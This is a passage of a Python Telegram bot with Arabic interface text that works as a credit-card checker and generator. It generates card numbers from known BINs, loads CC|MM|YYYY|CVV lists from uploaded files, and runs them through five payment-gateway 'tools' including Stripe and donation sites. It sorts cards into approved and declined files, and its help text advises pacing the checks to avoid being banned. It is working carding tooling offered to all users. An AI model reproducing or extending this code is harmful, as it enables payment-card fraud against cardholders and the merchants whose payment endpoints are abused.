    space_mb = space_kb / 1024
    
    if space_mb >= 1:
        space_str = f"{space_mb:.2f} MB"
    else:
        space_str = f"{space_kb:.2f} KB"
    
    # قائمة الملفات المحذوفة (مختصرة)
    files_list = "\n".join([f"• {f}" for f in deleted_files_list[:10]])
    if len(deleted_files_list) > 10:
        files_list += f"\n• ... و {len(deleted_files_list)-10} ملفات أخرى"
    
    await update.message.reply_text(
        f"🧹 *تم التنظيف بنجاح!*\n"
        f"════════════\n"
        f"📁 عدد الملفات المحذوفة: {files_deleted}\n"
        f"💾 المساحة المحررة: {space_str}\n\n"
        f"📋 الملفات المحذوفة:\n{files_list}",
        parse_mode='Markdown',
        reply_markup=get_main_keyboard()
    )

# ==================== معالجات الأوامر ====================

async def auth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر فحص باستخدام أداة Original"""
    await check_single_card_command(update, context, 'tool1')

async def donate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر فحص باستخدام أداة Donation"""
    await check_single_card_command(update, context, 'tool2')

async def stripe_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر فحص باستخدام أداة Stripe Forechrist"""
    await check_single_card_command(update, context, 'tool3')

async def melhair_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر فحص باستخدام أداة Stripe Melhair"""
    await check_single_card_command(update, context, 'tool4')

async def vast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر فحص باستخدام أداة Vast Checker"""
    await check_single_card_command(update, context, 'tool5')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالج الأزرار"""
    query = update.callback_query
    await query.answer()
    
    global stop_checking, active_tools, tool_threads, current_file_in_use
    
    # ========== القوائم الرئيسية ==========
    if query.data == "back_to_main":
        await query.edit_message_text(
            text="🔍 *القائمة الرئيسية*\nاختر الأداة التي تريد تشغيلها:",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
    
    # ========== قائمة اختيار الملفات ==========
    elif query.data == "select_file_menu":
        txt_files = get_txt_files()
        if txt_files:
            file_list = "\n".join([f"• `{f}`" for f in txt_files[:10]])
            if len(txt_files) > 10:
                file_list += f"\n• ... و {len(txt_files)-10} ملفات أخرى"
            
            await query.edit_message_text(
                text=f"📂 *اختر ملف للفحص*\n\n"
                     f"الملفات المتوفرة:\n{file_list}\n\n"
                     f"اختر ملف من القائمة أدناه:",
                parse_mode='Markdown',
                reply_markup=get_file_selection_keyboard()
            )
        else:
            await query.edit_message_text(
                text="📭 *لا توجد ملفات txt للفحص*\n\n"
                     "يمكنك:\n"
                     "• إرسال ملف txt مباشرة\n"
                     "• استخدام /gen لتوليد بطاقات جديدة",
                parse_mode='Markdown',
                reply_markup=get_main_keyboard()
            )
    
    elif query.data == "refresh_files":
        txt_files = get_txt_files()
        await query.edit_message_text(
            text=f"📂 *تم تحديث القائمة*\nعدد الملفات: {len(txt_files)}",
            parse_mode='Markdown',
            reply_markup=get_file_selection_keyboard()
        )
    
    elif query.data.startswith("select_file_"):
        filename = query.data.replace("select_file_", "")
        context.user_data['selected_file'] = filename
        await query.edit_message_text(
            text=f"✅ *تم اختيار الملف:* `{filename}`\n\n"
                 f"الآن يمكنك تشغيل أي أداة لفحص هذا الملف",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
    
    # ========== قوائم الأدوات ==========
    elif query.data.startswith("menu_tool"):
        tool_id = query.data.replace("menu_", "")
        tool = TOOLS[tool_id]
        status = "🟢 نشط" if tool['active'] else "🔴 متوقف"
        
        selected_file = context.user_data.get('selected_file', 'لم يتم اختيار ملف')
        
        info_msg = f"""
{tool['icon']} *{tool['name']}* {tool['icon']}
════════════════
📌 *نوع البوابة:* {tool['type']}
📝 *الوصف:* {tool['desc']}
⚡ *السرعة:* {tool['speed']}
✅ *نسبة النجاح:* {tool['success_rate']}
🔧 *المتطلبات:* {tool['requirements']}
📊 *الحالة:* {status}
📂 *الملف المختار:* `{selected_file}`
🔑 *الأمر:* /{tool['cmd']}

📁 *الإحصائيات الحالية:*
• تم الفحص: {tool['stats']['checked']}/{tool['stats']['total']}
• ✅ الناجحة: {tool['stats']['approved']}
• ❌ المرفوضة: {tool['stats']['declined']}
• ⚠️ الأخطاء: {tool['stats']['errors']}"""
        
        await query.edit_message_text(
            text=info_msg,
            parse_mode='Markdown',
            reply_markup=get_tool_keyboard(tool_id)
        )
    
    elif query.data == "menu_all_tools":
        selected_file = context.user_data.get('selected_file', 'لم يتم اختيار ملف')
        await query.edit_message_text(
            text=f"⚡ *التحكم بجميع الأدوات*\n"
                 f"📂 الملف المختار: `{selected_file}`\n\n"
                 f"يمكنك تشغيل أو إيقاف جميع الأدوات دفعة واحدة:",
            parse_mode='Markdown',
            reply_markup=get_all_tools_keyboard()
        )
    
    # ========== تشغيل أداة محددة ==========
    elif query.data.startswith("start_tool"):
        tool_id = query.data.replace("start_", "")
        
        # التحقق من وجود ملف مختار
        selected_file = context.user_data.get('selected_file')
        if not selected_file or not os.path.exists(selected_file):
            await query.edit_message_text(
                text="❌ *لم يتم اختيار ملف للفحص*\n"
                     "الرجاء اختيار ملف أولاً من قائمة '📂 اختيار ملف'",
                parse_mode='Markdown',
                reply_markup=get_file_selection_keyboard()
            )
            return
        
        if TOOLS[tool_id]['active']:
            await query.edit_message_text(
                text=f"⚠️ الأداة {TOOLS[tool_id]['name']} تعمل بالفعل",
                parse_mode='Markdown',
                reply_markup=get_tool_keyboard(tool_id)
            )
            return
        
        # قراءة البطاقات من الملف المختار
        try:
            with open(selected_file, "r", encoding='utf-8', errors='ignore') as f:
                cards = [l.strip() for l in f.readlines() if l.strip()]
        except Exception as e:
            await query.edit_message_text(
                text=f"❌ خطأ في قراءة الملف: {str(e)[:100]}",
                parse_mode='Markdown',
                reply_markup=get_main_keyboard()
            )
            return
        
        if not cards:
            await query.edit_message_text(
                text="❌ الملف فارغ!",
                parse_mode='Markdown',
                reply_markup=get_tool_keyboard(tool_id)
            )
            return
        
        await query.edit_message_text(
            text=f"🔄 *جاري تشغيل {TOOLS[tool_id]['name']}...*\n"
                 f"📂 الملف: {selected_file}\n"
                 f"📁 عدد البطاقات: {len(cards)}",
            parse_mode='Markdown'
        )
        
        # تشغيل الأداة في ثريد منفصل
        thread = threading.Thread(
            target=run_tool,
            args=(tool_id, query.message.chat_id, context.bot, cards, selected_file)
        )
        thread.daemon = True
        thread.start()
        tool_threads[tool_id] = thread
    
    # ========== إيقاف أداة محددة ==========
    elif query.data.startswith("stop_tool"):
        tool_id = query.data.replace("stop_", "")
        TOOLS[tool_id]['active'] = False
        await query.edit_message_text(
            text=f"⏹️ *تم إيقاف {TOOLS[tool_id]['name']}*",
            parse_mode='Markdown',
            reply_markup=get_tool_keyboard(tool_id)
        )
    
    # ========== تشغيل جميع الأدوات ==========
    elif query.data == "start_all":
        # التحقق من وجود ملف مختار
        selected_file = context.user_data.get('selected_file')
        if not selected_file or not os.path.exists(selected_file):
            await query.edit_message_text(
                text="❌ *لم يتم اختيار ملف للفحص*\n"
                     "الرجاء اختيار ملف أولاً من قائمة '📂 اختيار ملف'",
                parse_mode='Markdown',
                reply_markup=get_file_selection_keyboard()
            )
            return
        
        try:
            with open(selected_file, "r", encoding='utf-8', errors='ignore') as f:
                cards = [l.strip() for l in f.readlines() if l.strip()]
        except Exception as e:
            await query.edit_message_text(
                text=f"❌ خطأ في قراءة الملف: {str(e)[:100]}",
                parse_mode='Markdown',
                reply_markup=get_main_keyboard()
            )
            return
        
        await query.edit_message_text(
            text=f"🔄 *جاري تشغيل جميع الأدوات ({len(TOOLS)} أدوات)*\n"
                 f"📂 الملف: {selected_file}\n"
                 f"📁 عدد البطاقات: {len(cards)}",
            parse_mode='Markdown'
        )
        
        # تشغيل كل أداة في ثريد منفصل
        for tool_id in TOOLS.keys():
            if not TOOLS[tool_id]['active']:
                thread = threading.Thread(
                    target=run_tool,
                    args=(tool_id, query.message.chat_id, context.bot, cards, selected_file)
                )
                thread.daemon = True
                thread.start()
                tool_threads[tool_id] = thread
                time.sleep(2)  # انتظار بين تشغيل الأدوات
    
    # ========== إيقاف جميع الأدوات ==========
    elif query.data == "stop_all":
        for tool_id in TOOLS.keys():
            TOOLS[tool_id]['active'] = False
        stop_checking = True
        await query.edit_message_text(
            text="⏹️ *تم إيقاف جميع الأدوات*",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
    
    # ========== إحصائيات ==========
    elif query.data == "show_global_stats":
        total_cards = 0
        total_checked = 0
        total_approved = 0
        total_declined = 0
        total_errors = 0
        active_count = 0
        
        stats_msg = " \n"
        stats_msg += "     📊 *الإحصائيات الشاملة*     \n"
        stats_msg += " \n"
        
        for tool_id, tool in TOOLS.items():
            total_cards += tool['stats']['total']
            total_checked += tool['stats']['checked']
            total_approved += tool['stats']['approved']
            total_declined += tool['stats']['declined']
            total_errors += tool['stats']['errors']
            if tool['active']:
                active_count += 1
            stats_msg += f" {tool['icon']} {tool['name'][:15]}...\n"
        
        stats_msg += " \n"
        stats_msg += f" 🟢 الأدوات النشطة: {active_count}/5        \n"
        stats_msg += f" 📁 إجمالي البطاقات: {total_cards}        \n"
        stats_msg += f" ✅ تم الفحص: {total_checked}/{total_cards}        \n"
        stats_msg += f" ✅ الناجحة: {total_approved}              \n"
        stats_msg += f" ❌ المرفوضة: {total_declined}              \n"
        stats_msg += f" ⚠️ الأخطاء: {total_errors}               \n"
        stats_msg += f" 📂 الملف الحالي: {current_file_in_use or 'لا يوجد'} \n"
        stats_msg += " "
        
        await query.edit_message_text(
            text=stats_msg,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
    
    # ========== إحصائيات أداة محددة ==========
    elif query.data.startswith("stats_tool"):
        tool_id = query.data.replace("stats_", "")
        tool = TOOLS[tool_id]
        elapsed = time.time() - tool['stats']['start_time'] if tool['stats']['start_time'] > 0 else 0
        
        stats_msg = f"""
{tool['icon']} *إحصائيات {tool['name']}* {tool['icon']}
══════════════════
📊 *الحالة:* {'🟢 نشط' if tool['active'] else '🔴 متوقف'}
📁 *الإجمالي:* {tool['stats']['total']} بطاقة
✅ *تم الفحص:* {tool['stats']['checked']}
📈 *النسبة:* {(tool['stats']['checked']/tool['stats']['total']*100) if tool['stats']['total'] > 0 else 0:.1f}%

📊 *النتائج:*
• ✅ الناجحة: {tool['stats']['approved']}
• ❌ المرفوضة: {tool['stats']['declined']}
• ⚠️ الأخطاء: {tool['stats']['errors']}

⏱️ *الوقت:* {format_time(elapsed)}
⚡ *السرعة:* {tool['speed']}
✅ *نسبة النجاح المتوقعة:* {tool['success_rate']}"""
        
        await query.edit_message_text(
            text=stats_msg,
            parse_mode='Markdown',
            reply_markup=get_tool_keyboard(tool_id)
        )
    
    # ========== معلومات أداة ==========
    elif query.data.startswith("info_tool"):
        tool_id = query.data.replace("info_", "")
        tool = TOOLS[tool_id]
        
        info_msg = f"""
{tool['icon']} *{tool['name']}* {tool['icon']}
═════════════════
📌 *نوع البوابة:* {tool['type']}
📝 *الوصف:* {tool['desc']}
⚙️ *طريقة العمل:* 
• {tool['desc']}
• السرعة: {tool['speed']}
• نسبة النجاح: {tool['success_rate']}
• المتطلبات: {tool['requirements']}
• الأمر السريع: /{tool['cmd']}

💡 *نصائح للاستخدام:*
• تأكد من صيغة البطاقة: CC|MM|YYYY|CVV
• انتظر بين البطاقات لتجنب الحظر
• البطاقات التي تبدأ بـ 424242 غالباً صالحة"""
        
        await query.edit_message_text(
            text=info_msg,
            parse_mode='Markdown',
            reply_markup=get_tool_keyboard(tool_id)
        )
    
    # ========== قائمة النتائج ==========
    elif query.data == "show_all_results":
        await query.edit_message_text(
            text="📁 *نتائج الفحص*\nاختر نوع النتائج التي تريد تحميلها:",
            parse_mode='Markdown',
            reply_markup=get_results_keyboard()
        )
    
    # ========== تحميل نتائج أداة محددة ==========
    elif query.data.startswith("get_tool"):
        tool_id = query.data.replace("get_", "").replace("_results", "")
        tool = TOOLS[tool_id]
        
        files_sent = 0
        for file_type in ['approved', 'declined', 'errors']:
            filename = f"{file_type}_{tool_id}.txt"
            if os.path.exists(filename) and os.path.getsize(filename) > 0:
                with open(filename, "rb") as f:
                    await context.bot.send_document(
                        chat_id=query.message.chat_id,
                        document=f,
                        filename=filename,
                        caption=f"{tool['icon']} {tool['name']} - {file_type}"
                    )
                    files_sent += 1
        
        if files_sent == 0:
            await query.edit_message_text(
                text=f"📭 لا توجد نتائج لـ {tool['name']} بعد",
                parse_mode='Markdown',
                reply_markup=get_results_keyboard()
            )
    
    # ========== نتائج شاملة ==========
    elif query.data == "get_combined_results":
        await query.edit_message_text(
            text="📊 *جاري تجميع النتائج الشاملة...*",
            parse_mode='Markdown'
        )
        
        # تجميع كل النتائج في ملف واحد
        with open("all_results.txt", "w", encoding="utf-8") as combined:
            combined.write("=" * 80 + "\n")
            combined.write("النتائج الشاملة لجميع الأدوات\n")
            combined.write("=" * 80 + "\n\n")
            
            for tool_id, tool in TOOLS.items():
                combined.write(f"\n{tool['icon']} {tool['name']}\n")
                combined.write("-" * 40 + "\n")
                
                for file_type in ['approved', 'declined', 'errors']:
                    filename = f"{file_type}_{tool_id}.txt"
                    if os.path.exists(filename):
                        combined.write(f"\n[{file_type.upper()}]:\n")
                        with open(filename, "r", encoding="utf-8") as f:
                            combined.write(f.read())
        
        if os.path.exists("all_results.txt") and os.path.getsize("all_results.txt") > 0:
            with open("all_results.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="all_results.txt",
                    caption="📊 جميع نتائج الفحص"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد نتائج بعد",
                parse_mode='Markdown',
                reply_markup=get_results_keyboard()
            )
    
    # ========== قائمة توليد البطاقات ==========
    elif query.data == "generate_menu":
        await query.edit_message_text(
            text="🎲 *توليد بطاقات*\nاختر نوع البطاقة أو أدخل BIN يدوي:",
            parse_mode='Markdown',
            reply_markup=get_generate_keyboard()
        )
    
    # ========== توليد بطاقات من BINs معروفة ==========
    elif query.data.startswith("gen_"):
        if query.data == "gen_visa":
            bin_prefix = "42588146"
            bin_name = "فيزا"
        elif query.data == "gen_master":
            bin_prefix = "51546200"
            bin_name = "ماستركارد"
        elif query.data == "gen_amex":
            bin_prefix = "340000"
            bin_name = "أمريكان إكسبريس"
        elif query.data == "gen_discover":
            bin_prefix = "601100"
            bin_name = "ديسكفر"
        elif query.data == "gen_custom":
            await query.edit_message_text(
                text="🔢 *إدخال BIN يدوي*\n"
                     "الرجاء إرسال BIN الذي تريد استخدامه:\n"
                     "مثال: `411111`\n\n"
                     "يمكنك أيضاً إرسال الأمر:\n"
                     "`/gen 411111 20` لتوليد 20 بطاقة",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 رجوع", callback_data="generate_menu")
                ]])
            )
            return
        
        # توليد 10 بطاقات افتراضياً
        count = 10
        cards = generate_cards(bin_prefix, count)
        
        # حفظ في ملف
        filename = f"generated_{bin_prefix}_{int(time.time())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(cards))
        
        preview = "\n".join(cards[:5])
        if len(cards) > 5:
            preview += f"\n... و {len(cards)-5} بطاقات أخرى"
        
        result_msg = f"""
✅ *تم توليد {count} بطاقة {bin_name} بنجاح!*
══════════════
🔢 *BIN:* `{bin_prefix}`
📁 *الملف:* `{filename}`
📝 *نموذج البطاقات:*
`{preview}`

✅ *تم حفظ البطاقات في ملف منفصل*

⚡ يمكنك الآن اختيار هذا الملف من قائمة "📂 اختيار ملف"
"""
        
        await query.edit_message_text(
            text=result_msg,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        
        # إرسال الملف للمستخدم
        with open(filename, "rb") as f:
            await context.bot.send_document(
                chat_id=query.message.chat_id,
                document=f,
                filename=filename,
                caption=f"🎲 {count} بطاقة {bin_name} مولدة من BIN {bin_prefix}"
            )
    
    # ========== قائمة التنظيف ==========
    elif query.data == "cleanup_menu":
        await query.edit_message_text(
            text="🧹 *تنظيف الملفات*\nاختر نوع الملفات التي تريد تنظيفها:",
            parse_mode='Markdown',
            reply_markup=get_cleanup_keyboard()
        )
    
    # ========== تنظيف الملفات ==========
    elif query.data.startswith("cleanup_"):
        cleanup_type = query.data.replace("cleanup_", "")
        
        if cleanup_type == "menu":
            return
        
        await query.edit_message_text(
            text=f"🧹 *جاري تنظيف الملفات...*",
            parse_mode='Markdown'
        )
        
        # تنفيذ التنظيف
        await cleanup_user_files(update, context, cleanup_type)
    
    # ========== المساعدة ==========
    elif query.data == "help":
        help_msg = f"""
                       ❓ *المساعدة* ❓                        
                                                              
  *📌 كيفية الاستخدام:*                   
  1️⃣ استخدم `/start` لبدء البوت                
  2️⃣ أرسل أي ملف `.txt` أو استخدم `/gen` لتوليد بطاقات        
  3️⃣ اختر الملف من قائمة "📂 اختيار ملف"             
  4️⃣ اختر الأداة من القائمة أو استخدم الأوامر السريعة        
                                                              
  *🔑 الأوامر السريعة:*                                       
  • `/auth CC|MM|YYYY|CVV` - فحص باستخدام Original           
  • `/donate CC|MM|YYYY|CVV` - فحص باستخدام Donation         
  • `/stripe CC|MM|YYYY|CVV` - فحص باستخدام Stripe           
  • `/melhair CC|MM|YYYY|CVV` - فحص باستخدام Melhair         
  • `/Checker CC|MM|YYYY|CVV` - فحص باستخدام Checker         
                                                              
  *🎲 توليد بطاقات:*                                          
  • `/gen` - فتح قائمة التوليد          
  • `/gen 411111` - توليد 5 بطاقات من BIN 411111            
  • `/gen 411111 20` - توليد 20 بطاقة من BIN 411111         
                                     
  *📂 إدارة الملفات:*             
  • البوت يقبل أي ملف txt مهما كان اسمه      
  • استخدم "📂 اختيار ملف" لاختيار ملف للفحص    
  • الملفات تبقى محفوظة حتى تقوم بتنظيفها      
                                                              
  *🧹 التنظيف:*                
  • استخدم زر "🧹 تنظيف" من القائمة            
  • أو استخدم `/cleanup` لتنظيف كل الملفات      
                                           
  *🎯 مميزات النظام:*                
  • 5 أدوات فحص مختلفة                   
  • يدعم جميع ملفات .txt                  
  • تشغيل منفصل أو متزامن              
  • إحصائيات مباشرة لكل أداة              
  • ملفات نتائج منفصلة                    
  • تتبع الملف المستخدم حالياً               
                                      
  *⚠️ ملاحظات مهمة:*                                
  • صيغة الملف: CC|MM|YYYY|CVV                               
  • انتظر بين البطاقات (5-10 ثواني)                          
  • استخدم `/cleanup` لتنظيف الملفات بانتظام                 
                                        """
        
        await query.edit_message_text(
            text=help_msg,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """استقبال الملفات - يدعم جميع أسماء ملفات txt"""
    
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    await update.message.reply_text("📥 جاري استلام الملف...")
    
    try:
        file = await update.message.document.get_file()
        
        if not update.message.document.file_name.endswith('.txt'):
            await update.message.reply_text(
                "❌ الملف يجب أن يكون بصيغة .txt",
                reply_markup=get_main_keyboard()
            )
            return
        
        # حفظ الملف باسمه الأصلي
        original_filename = update.message.document.file_name
        file_path = original_filename
        
        # إذا كان الملف موجوداً بالفعل، أضف رقم للملف
        if os.path.exists(file_path):
            base, ext = os.path.splitext(original_filename)
            counter = 1
            while os.path.exists(f"{base}_{counter}{ext}"):
                counter += 1
            file_path = f"{base}_{counter}{ext}"
        
        await file.download_to_drive(file_path)
        
        # حفظ نسخة في المجلد المؤقت
        temp_file_path = os.path.join(TEMP_DIR, f"{user_id}_{int(time.time())}_{original_filename}")
        shutil.copy2(file_path, temp_file_path)
        
        # قراءة الملف لعرض ملخص
        with open(file_path, "r", encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
        
        preview = "\n".join(lines[:5])
        if len(lines) > 5:
            preview += f"\n... و {len(lines)-5} بطاقات أخرى"
        
        # تعيين هذا الملف كملف مختار تلقائياً
        context.user_data['selected_file'] = file_path
        
        success_msg = f"""
✅ *تم استلام الملف بنجاح!*
═════════════
📁 اسم الملف: `{file_path}`
📊 عدد البطاقات: {len(lines)}
📝 نموذج من البطاقات:
`{preview}`

✅ *تم تعيين هذا الملف للفحص تلقائياً*

⚡ يمكنك الآن:
• تشغيل أداة محددة من القائمة
• تشغيل جميع الأدوات دفعة واحدة
• استخدام الأوامر السريعة
"""
        
        await update.message.reply_text(
            success_msg,
            parse_mode='Markdown',
            reply_markup=get_main_keyboard()
        )
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ حدث خطأ: {str(e)[:200]}",
            reply_markup=get_main_keyboard()
        )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """عرض الحالة"""
    await button_handler(update, context)

async def cleanup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر تنظيف الملفات"""
    await cleanup_user_files(update, context, "all")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر المساعدة"""
    await start(update, context)

# ==================== التشغيل الرئيسي ====================

def main():
    """تشغيل البوت"""
    # تشغيل Flask server
    keep_alive()
    
    # إنشاء المجلدات المؤقتة
    os.makedirs(TEMP_DIR, exist_ok=True)
    
    # طباعة البانر
    print_banner()
    print(f"{Fore.GREEN}🤖 جاري تشغيل البوت...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📂 يدعم جميع ملفات .txt للفحص{Style.RESET_ALL}")
    
    # إنشاء التطبيق
    application = Application.builder().token(BOT_TOKEN).build()
    
    # إضافة المعالجات
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("cleanup", cleanup_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # أوامر توليد البطاقات
    application.add_handler(CommandHandler("gen", generate_command))
    
    # أوامر الفحص السريع
    application.add_handler(CommandHandler("auth", auth_command))
    application.add_handler(CommandHandler("donate", donate_command))
    application.add_handler(CommandHandler("stripe", stripe_command))
    application.add_handler(CommandHandler("melhair", melhair_command))
    application.add_handler(CommandHandler("Checker", vast_command))
    
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # تشغيل البوت
    print(f"{Fore.GREEN}✅ البوت جاهز للعمل! متاح لجميع المستخدمين{Style.RESET_ALL}")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️ تم إيقاف البوت بواسطة المستخدم{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}❌ خطأ: {e}{Style.RESET_ALL}")
